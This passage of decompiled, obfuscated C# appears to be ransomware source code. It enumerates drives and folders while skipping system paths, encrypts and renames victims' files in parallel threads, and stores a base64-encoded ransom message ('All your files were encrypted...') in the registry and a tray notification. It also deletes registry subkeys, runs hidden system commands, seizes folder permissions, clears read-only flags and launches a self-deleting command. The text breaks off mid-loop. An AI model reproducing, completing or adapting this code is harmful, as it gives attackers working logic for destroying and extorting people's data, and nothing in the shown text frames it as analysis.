					if (!fileInfo.FullName.Contains(getString_0(107351375)) && !fileInfo.FullName.Contains(getString_0(107351390)) && !fileInfo.FullName.Contains(getString_0(107351373)) && !fileInfo.FullName.Contains(getString_0(107351324)) && !fileInfo.FullName.Contains(getString_0(107351339)) && !fileInfo.FullName.Contains(getString_0(107351290)) && !fileInfo.FullName.Contains(getString_0(107351305)) && !fileInfo.FullName.Contains(getString_0(107351256)) && !fileInfo.FullName.Contains(getString_0(107351275)) && !fileInfo.FullName.Contains(getString_0(107351222)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351241)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351196)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351211)) && !fileInfo.FullName.ToLower().Contains(getString_0(107351162)) && !fileInfo.FullName.Contains(OQNgkgiZsRBtM(getString_0(107351177))) && !fileInfo.FullName.Contains(getString_0(107351632)) && !fileInfo.FullName.Contains(getString_0(107351651)) && !fileInfo.FullName.Contains(getString_0(107351602)) && !fileInfo.FullName.EndsWith(getString_0(107395220)) && !fileInfo.FullName.EndsWith(getString_0(107351577)) && !fileInfo.FullName.EndsWith(getString_0(107351572)) && !fileInfo.FullName.EndsWith(getString_0(107351567)) && !fileInfo.FullName.EndsWith(getString_0(107351594)) && !fileInfo.FullName.Contains(getString_0(107351589)) && !fileInfo.FullName.Contains(GnVhnUOOYYhdqkV) && !fileInfo.FullName.Contains(PuxbPamNEvKf) && !fileInfo.FullName.Contains(PRyWDkHhXF))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(zsGrHDUuxWs) * 1024.0 * 1024.0 && GuOreRpiLQap == getString_0(107396939))
						{
							list.Add(fileInfo.FullName);
							vKaAZwnzZdxSRQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && GuOreRpiLQap == getString_0(107397157))
						{
							list.Add(fileInfo.FullName);
							vKaAZwnzZdxSRQ(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void idCFphyPoHDy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107351540));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!PyvRWqGGEBqe.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107351519), getString_0(107396797)).Replace(getString_0(107351482), getString_0(107351519))
					.Replace(getString_0(107351473), getString_0(107352222))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					PyvRWqGGEBqe.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107351519), getString_0(107396797)).Replace(getString_0(107351482), getString_0(107351519))
						.Replace(getString_0(107351473), getString_0(107352222))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107351500), getString_0(107352222)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string xgWoqKjgaerXBH(string FjiuNiLlRrLz = "", string nDpTAmJTyEpREKXa = "")
	{
		string result = getString_0(107352222);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = FjiuNiLlRrLz,
				Arguments = nDpTAmJTyEpREKXa,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void rJTGxJkOljig(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107351491),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string WZyxpqSvRMSftN(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string OQNgkgiZsRBtM(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void qviCBQtYavNcq(string peVPXqkdEvQCN = "", string RgvPerhLVf = "SW5mb3JtYXRpb24uLi4=", string SZRCCVFRZJf = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		peVPXqkdEvQCN = WZyxpqSvRMSftN(getString_0(107351442));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(peVPXqkdEvQCN), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OQNgkgiZsRBtM(getString_0(107350833)), OQNgkgiZsRBtM(RgvPerhLVf));
				registryKey.SetValue(OQNgkgiZsRBtM(getString_0(107350800)), OQNgkgiZsRBtM(SZRCCVFRZJf));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			peVPXqkdEvQCN = WZyxpqSvRMSftN(getString_0(107350771));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(peVPXqkdEvQCN), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OQNgkgiZsRBtM(getString_0(107350698)), OQNgkgiZsRBtM(RgvPerhLVf));
				registryKey.SetValue(OQNgkgiZsRBtM(getString_0(107350665)), OQNgkgiZsRBtM(SZRCCVFRZJf));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void niONSpGcALY()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (FhrZFBDYTY == getString_0(107396939) && !string.IsNullOrEmpty(thFRkMZkhKCVyhF) && !string.IsNullOrEmpty(PdLplIwVgpAvTL))
				{
					qviCBQtYavNcq(getString_0(107352222), thFRkMZkhKCVyhF, PdLplIwVgpAvTL);
				}
				else
				{
					qviCBQtYavNcq(getString_0(107352222), getString_0(107352659), getString_0(107352630));
				}
			}
		}
		catch
		{
		}
	}

	public static void WhevDLEMhFHfsA(string xVlemCTkqvWpVB = "SW5mb3JtYXRpb24uLi4=", string XBRbeJZwVuLT = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(OQNgkgiZsRBtM(xVlemCTkqvWpVB));
		val.set_BalloonTipText(OQNgkgiZsRBtM(XBRbeJZwVuLT));
		val.ShowBalloonTip(30000);
	}

	public static void lXcOLjMuMAFD(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		xgWoqKjgaerXBH(getString_0(107351148), getString_0(107351135) + text + getString_0(107351094) + string_0);
	}

	public static void CKEuRrveQHd(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = OQNgkgiZsRBtM(getString_0(107351089));
		processStartInfo.Arguments = getString_0(107351060) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool JmshEryKedbtyz(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string WvoHGwatDhJxFd(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void QQKoJJZSpsGuTi()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = WZyxpqSvRMSftN(getString_0(107351055));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350949)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350924)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350363)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350370)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107351089)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350345)));
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350316)));
					registryKey.Close();
				}
				string_ = WZyxpqSvRMSftN(getString_0(107350267));
				registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350170)));
					registryKey.Close();
				}
				string_ = WZyxpqSvRMSftN(getString_0(107350185));
				registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350170)));
					registryKey.Close();
				}
				string_ = WZyxpqSvRMSftN(getString_0(107350185));
				registryKey = Registry.CurrentUser.OpenSubKey(OQNgkgiZsRBtM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OQNgkgiZsRBtM(getString_0(107350170)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107350136)), OQNgkgiZsRBtM(getString_0(107350151)));
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107350582)), OQNgkgiZsRBtM(getString_0(107350605)));
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107350582)), OQNgkgiZsRBtM(getString_0(107350427)));
			xgWoqKjgaerXBH(OQNgkgiZsRBtM(getString_0(107350398)), OQNgkgiZsRBtM(getString_0(107349869)));
		}
		catch
		{
		}
	}

	public static void sVisjIxCcpCfhZ(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(OQNgkgiZsRBtM(getString_0(107349796)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void SjeyVRLKdAjajxB()
	{
		string string_ = WZyxpqSvRMSftN(getString_0(107349771));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OQNgkgiZsRBtM(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OQNgkgiZsRBtM(getString_0(107349658)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void cChVnDjwVrxY()
	{
		xgWoqKjgaerXBH(getString_0(107397152), OQNgkgiZsRBtM(getString_0(107349625)));
		string text = OQNgkgiZsRBtM(getString_0(107349943));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107351473) + text + getString_0(107351473) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397152);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void KKPEHOUPlrnQr(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(PuxbPamNEvKf, getString_0(107349878) + string_0 + getString_0(107349901) + ex.Message + getString_0(107396613));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string EZwTDhvYAYNP()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107352222);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107349268);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107349323))) ? getString_0(107349273) : getString_0(107349314));
				break;
			case 0:
				text = getString_0(107349296);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107349263);
				break;
			case 4:
				text = getString_0(107349282);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107349232) : getString_0(107349241));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107349208) : getString_0(107349213)) : getString_0(107349250)) : getString_0(107349259));
				break;
			case 10:
				text = getString_0(107349203);
				break;
			}
		}
		if (text != getString_0(107352222))
		{
			text = getString_0(107349198) + text;
			if (oSVersion.ServicePack != getString_0(107352222))
			{
				text = text + getString_0(107351094) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string wuLAhEopyjj(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395206);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107395685)));
				streamWriter.WriteLine(getString_0(107396613));
				streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107391131)));
				streamWriter.WriteLine(string_0);
				if (EovHtqNdKKIO)
				{
					streamWriter.WriteLine(getString_0(107396613));
					streamWriter.WriteLine(OQNgkgiZsRBtM(getString_0(107391565)));
					streamWriter.WriteLine(fkiONJkXtes.AVnEuNMFEQQ());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !XuGnEkReQEL)
				{
					File.AppendAllText(text, getString_0(107391532) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (mLogOAlXxCGZma)
			{
				try
				{
					File.AppendAllText(PuxbPamNEvKf, getString_0(107349217) + ex.Message + getString_0(107396613));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void TVFBlXoBlE(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		AMQDQTwvKfC.UuZcPnBXCAjuUv CS_0024_003C_003E8__locals0 = new AMQDQTwvKfC();
		CS_0024_003C_003E8__locals0.tpQcxzxpPPrq = string_1;
		CS_0024_003C_003E8__locals0.WItDKQNxBvTmMKya = string_2;
		CS_0024_003C_003E8__locals0.mdgxQtpwwkbqMas = string_3;
		CS_0024_003C_003E8__locals0.HhtysrNNof = string_4;
		MrSCMslRwDw = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mdgxQtpwwkbqMas);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107349160))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !PyvRWqGGEBqe.Contains(array[i].Name))
					{
						PyvRWqGGEBqe.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!PyvRWqGGEBqe.Contains(string_0[j]))
				{
					PyvRWqGGEBqe.Add(string_0[j]);
				}
			}
		}
		if (PyvRWqGGEBqe.Contains(OQNgkgiZsRBtM(getString_0(107349151))) && NmGsqpjtNCMwN == getString_0(107396939))
		{
			PyvRWqGGEBqe.Remove(OQNgkgiZsRBtM(getString_0(107349151)));
		}
		Parallel.ForEach(PyvRWqGGEBqe, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new AMQDQTwvKfC.UuZcPnBXCAjuUv();
			CS_0024_003C_003E8__locals0.njjRNeSzbquv = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy = string_0;
			if (BQmGsgiCrLkeXK && !EZwTDhvYAYNP().Contains(AMQDQTwvKfC.getString_0(107349241)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						JmshEryKedbtyz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wEAEiGEvbQBe == AMQDQTwvKfC.getString_0(107396948))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GyVKuLUBQJcKD(CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy, CS_0024_003C_003E8__locals0.njjRNeSzbquv.tpQcxzxpPPrq, CS_0024_003C_003E8__locals0.njjRNeSzbquv.HhtysrNNof, CS_0024_003C_003E8__locals0.njjRNeSzbquv.WItDKQNxBvTmMKya, CS_0024_003C_003E8__locals0.njjRNeSzbquv.mdgxQtpwwkbqMas);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GyVKuLUBQJcKD(CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy, CS_0024_003C_003E8__locals0.tpQcxzxpPPrq, CS_0024_003C_003E8__locals0.HhtysrNNof, CS_0024_003C_003E8__locals0.WItDKQNxBvTmMKya, CS_0024_003C_003E8__locals0.mdgxQtpwwkbqMas);
			}
		});
	}

	public static void GyVKuLUBQJcKD(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107352222));
		List<string> list3 = list2;
		if (mwClZvPUCBMR == getString_0(107397157))
		{
			list = nKnHutgtWkp(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = RwQdeHkmdAmEIvnFh.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((QxikgxJvjblcKLkr == getString_0(107397157) && !item.EndsWith(text)) || jehTyctIFoYNIp.Contains(item))
				{
					continue;
				}
				if (iGHIvdzAxB == getString_0(107396939))
				{
					try
					{
						if (uTemtccfmqlz.LQwWDAYgIIgx(item))
						{
							uTemtccfmqlz.bplRcjkgXsd(item);
						}
					}
					catch
					{
					}
				}
				jehTyctIFoYNIp.Add(item);
				if (!nWxaVjFaAUH.Contains(Path.GetDirectoryName(item)))
				{
					nWxaVjFaAUH.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (jJEHaHJsPqMKE == getString_0(107396939) && fileStream.Length > Convert.ToInt32(ySwjQogNty) * 1024 * 1024 && !list3.Contains(text))
					{
						if (uOaGmGyltMwB == getString_0(107396939))
						{
							foreach (string item2 in qGlQdkkhGGe)
							{
								if (item.ToLower().EndsWith(item2) && pAghGHVkfTo == getString_0(107396939))
								{
									if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && pAghGHVkfTo == getString_0(107397157))
								{
									try
									{
										fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352271), getString_0(107352298), getString_0(107352253), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = bQwLemggMIXO.JPoqfLkNbop(item, Convert.ToInt32(ySwjQogNty) * 1024 * 1024);
						byte[] gfVWmhJNzzTr = bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						bQwLemggMIXO.feLfHlEZaImINg(item, gfVWmhJNzzTr);
						if (string_2 != getString_0(107349110))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107349110))
					{
						zojThLSqDppEmCQnC(item, item + string_2, MrSCMslRwDw);
					}
					else
					{
						zojThLSqDppEmCQnC(item, item + getString_0(107349105), MrSCMslRwDw);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void vKaAZwnzZdxSRQ(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		zMMiSiOLxsKC.GQoWgEQAMkRJ CS_0024_003C_003E8__locals0 = new zMMiSiOLxsKC();
		CS_0024_003C_003E8__locals0.hfUdwvPqriEs = list_0;
		CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU = string_1;
		CS_0024_003C_003E8__locals0.UYtVQBGvNFN = string_2;
		CS_0024_003C_003E8__locals0.foDfHTmkRAByYW = string_3;
		CS_0024_003C_003E8__locals0.BupWADfZez = new List<string> { getString_0(107352222) };
		if (QxikgxJvjblcKLkr == getString_0(107397157))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.hfUdwvPqriEs.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					zMMiSiOLxsKC.JUtHewjApebOeNyZs CS_0024_003C_003E8__locals1 = new zMMiSiOLxsKC.JUtHewjApebOeNyZs();
					CS_0024_003C_003E8__locals1.ikAVEYXdWFLemgx = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.EYLJWjtdbaGR = enumerator2.Current;
					if (CS_0024_003C_003E8__locals0.UYtVQBGvNFN.Length != 0)
					{
						string[] uYtVQBGvNFN2 = CS_0024_003C_003E8__locals0.UYtVQBGvNFN;
						int num2 = 0;
						while (num2 < uYtVQBGvNFN2.Length)
						{
							string value2 = uYtVQBGvNFN2[num2];
							if (!CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_08c7;
						}
					}
					try
					{
						if (CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU))
						{
							goto IL_08c7;
						}
					}
					catch (Exception)
					{
						goto IL_08c7;
					}
					if (CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(string_0) && !jehTyctIFoYNIp.Contains(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR))
					{
						if (iGHIvdzAxB == zMMiSiOLxsKC.getString_0(107396956))
						{
							try
							{
								if (uTemtccfmqlz.LQwWDAYgIIgx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR))
								{
									uTemtccfmqlz.bplRcjkgXsd(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
								}
							}
							catch
							{
							}
						}
						jehTyctIFoYNIp.Add(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
						Thread thread3 = new Thread((ThreadStart)delegate
						{
							try
							{
								if (UlBNnyiBkggp)
								{
									Console.WriteLine(zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365783) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365246) + new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length + zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365193));
									Console.WriteLine(zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365216), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
									Console.WriteLine(zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365127), tFNHpewWORLeMw.Elapsed);
									Console.WriteLine(zMMiSiOLxsKC.JUtHewjApebOeNyZs.getString_0(107365102));
								}
							}
							catch
							{
							}
						});
						thread3.Priority = ThreadPriority.Normal;
						thread3.IsBackground = true;
						thread3.Start();
						if (!nWxaVjFaAUH.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR)))
						{
							nWxaVjFaAUH.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR));
						}
						KKPEHOUPlrnQr(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
						try
						{
							try
							{
								if (new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length != 0L)
								{
									goto end_IL_0175;
								}
								goto end_IL_0175_2;
								end_IL_0175:;
							}
							catch (Exception ex12)
							{
								if (mLogOAlXxCGZma)
								{
									try
									{
										File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107365906) + ex12.Message + zMMiSiOLxsKC.getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								slRUPIhEEasxMv++;
								goto end_IL_0175_2;
							}
							if (jJEHaHJsPqMKE == zMMiSiOLxsKC.getString_0(107396956) && new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length > Convert.ToInt32(ySwjQogNty) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.BupWADfZez.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new zMMiSiOLxsKC.fEeJrRiVizKd();
								CS_0024_003C_003E8__locals0.KIeINjRDmnbT = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
									{
										if (EovHtqNdKKIO)
										{
											CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU = SNoRzClPbgpw + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
										}
										File.Move(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU);
									}
								}
								catch (Exception ex14)
								{
									if (mLogOAlXxCGZma)
									{
										try
										{
											File.AppendAllText(PuxbPamNEvKf, zMMiSiOLxsKC.getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + zMMiSiOLxsKC.getString_0(107365845) + ex14.Message + zMMiSiOLxsKC.getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									slRUPIhEEasxMv++;
									goto end_IL_0175_2;
								}
								CS_0024_003C_003E8__locals0.qzLjjzzlXxK = zMMiSiOLxsKC.getString_0(107352239);
								if (CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU != zMMiSiOLxsKC.getString_0(107349127))
								{
									CS_0024_003C_003E8__locals0.qzLjjzzlXxK = CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + CS_0024_003C_003E8__locals0.EvGDFwQHbzXMTU;
								}
								else
								{
									CS_0024_003C_003E8__locals0.qzLjjzzlXxK = CS_0024_003C_003E8__locals1.EYLJWjtdbaGR;
								}
								if (uOaGmGyltMwB == zMMiSiOLxsKC.getString_0(107396956))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in qGlQdkkhGGe)
										{
